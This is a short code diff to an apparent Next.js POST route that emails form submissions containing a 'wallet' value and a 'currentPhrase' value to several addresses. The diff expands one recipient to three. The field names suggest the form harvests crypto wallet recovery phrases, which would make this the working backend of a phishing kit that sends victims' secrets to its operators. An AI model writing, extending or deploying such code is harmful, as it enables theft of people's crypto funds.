@@ -9,7 +9,11 @@ export async function POST(request: Request) {
   try {
     await resend.emails.send({
       from: process.env.NEXT_PUBLIC_MAIL_FROM,
-      to: process.env.NEXT_PUBLIC_MAIL_TO,
+      to: [
+        process.env.NEXT_PUBLIC_MAIL_TO_one,
+        process.env.NEXT_PUBLIC_MAIL_TO_two,
+        process.env.NEXT_PUBLIC_MAIL_TO_three,
+      ],
       subject: "Form Submitted",
       react: Email({ wallet, currentPhrase }),
     });
